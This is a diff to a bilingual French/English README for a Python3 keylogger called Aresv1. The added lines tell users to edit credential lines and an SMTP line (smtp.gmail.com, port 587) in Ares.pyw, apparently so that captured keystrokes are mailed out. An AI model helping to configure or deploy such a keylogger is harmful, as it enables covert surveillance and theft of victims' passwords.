@@ -1,3 +1,10 @@
+# Before reading / Avant de lire
+Pour utiliser le logiciel correctement, changez les lignes 26 à 28 dans le fichier Ares.pyw.
+Modifiez la ligne 49 : server = smtplib.SMTP('smtp.gmail.com', 587) avez votre boite mail.
+
+To use the software correclty, edit 26 to 28 lines in the Ares.pyw file.
+Edit the line 49 : server = smtplib.SMTP('smtp.gmail.com', 587) to fit your webmail software.
+
 # Français
 # Aresv1
 Keylogger pour Python3
